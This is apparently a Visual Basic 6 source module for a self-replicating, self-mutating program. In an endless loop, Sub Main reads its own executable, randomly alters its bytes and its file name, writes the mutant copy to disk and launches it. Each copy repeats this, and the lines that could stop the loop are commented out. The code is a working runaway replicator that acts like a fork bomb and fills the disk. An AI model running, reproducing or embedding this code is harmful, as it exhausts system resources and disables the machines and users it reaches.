Attribute VB_Name = "Module1"
Option Explicit

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessID As Long
    dwThreadID As Long
End Type

Private Const NORMAL_PRIORITY_CLASS = &H20&

Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
Private Declare Function QueryPerformanceCounter Lib "kernel32" (lpPerformanceCount As Currency) As Long
Private Declare Function QueryPerformanceFrequency Lib "kernel32" (lpFrequency As Currency) As Long

Private cFrequency As Currency
Private cCount As Currency

Sub Main()
    Dim b() As Byte

    Dim sFile As String
    Dim sNewFile As String

    Const lAdd As Long = 10000
    Const lDel As Long = 10000
    Const lMut As Long = 10000
    
    Const lTim As Long = 10000
    Const lRep As Long = 1000
    Const lChildren As Long = 1000
    
    Dim lPos As Long
    Dim lPos2 As Long
    
    Dim lChild As Long
    Dim bAlive As Boolean
    
    On Error Resume Next
    
    bAlive = True
    
    While bAlive
        DoEvents
        sNewFile = App.EXEName
        sFile = App.Path & "\" & sNewFile & ".exe"
        Open sFile For Binary Access Read As #1
        ReDim b(LOF(1) - 1) As Byte
        Get 1, , b
        Close #1
        
'        StartCounter
'        While GetCounter < lRep
'            DoEvents
'        Wend
    
        Randomize
    
        lPos = 0
        While lPos <= UBound(b)
            If Int(Rnd * lMut) = 0 Then
                b(lPos) = Int(Rnd * 256)
            End If
            If Int(Rnd * lAdd) = 0 Then
                ReDim Preserve b(UBound(b) + 1) As Byte
                For lPos2 = UBound(b) To lPos + 1 Step -1
                    b(lPos2) = b(lPos2 - 1)
                Next
            End If
            If Int(Rnd * lDel) = 0 Then
                For lPos2 = lPos To UBound(b) - 1
                    b(lPos2) = b(lPos2 + 1)
                Next
                ReDim Preserve b(UBound(b) - 1) As Byte
            End If
            lPos = lPos + 1
        Wend
    
        lPos = 1
        While lPos <= Len(sNewFile)
            If Int(Rnd * 10) = 0 Then
                sNewFile = Left$(sNewFile, lPos - 1) & Chr$(Rnd * 256) & Mid$(sNewFile, lPos + 1)
            End If
            If Int(Rnd * 50) = 0 Then
                sNewFile = Left$(sNewFile, lPos - 1) & Chr$(Rnd * 256) & Mid$(sNewFile, lPos)
            End If
            If Int(Rnd * 50) = 0 Then
                sNewFile = Left$(sNewFile, lPos - 1) & Mid$(sNewFile, lPos + 1)
            End If
            lPos = lPos + 1
        Wend
        
        Open sNewFile & ".exe" For Binary Access Write As #1
        Put 1, , b
        Close #1
        
        StartCounter
        While GetCounter < lTim
            DoEvents
        Wend
        
        Err.Clear
        'Kill App.Path & "\" & sNewFile & ".exe"
        If Err.Number = 0 Then
            OpenApplication App.Path & "\" & sNewFile & ".exe", App.Path
        End If
'        'Kill App.Path & "\" & sNewFile & ".exe"
'        With New FileSystemObject
'            If .FileExists(App.Path & "\" & sNewFile & ".exe") Then
'                'bAlive = False
'            End If
'        End With
    Wend
End Sub


Private Function OpenApplication(ByVal sPath As String, ByVal sFolderPath As String) As Long
    Dim proc As PROCESS_INFORMATION
    Dim start As STARTUPINFO
    
    start.cb = Len(start)
    CreateProcessA sPath, vbNullString, 0&, 0&, 1&, NORMAL_PRIORITY_CLASS, 0&, ByVal sFolderPath, start, proc
    OpenApplication = proc.hProcess
End Function

Private Function Wait(ByVal lTimeout As Single, lprocessid As Long)
    WaitForSingleObject lprocessid, CLng(lTimeout * 1000)
End Function

Public Function GetCounter() As Double
    Dim cCurrent As Currency
    Dim cFrequency As Currency
    
    QueryPerformanceFrequency cFrequency
    QueryPerformanceCounter cCurrent
    
    GetCounter = 1000 * CDbl(cCurrent - cCount) / CDbl(cFrequency)
End Function

Private Sub StartCounter()
    QueryPerformanceCounter cCount
End Sub
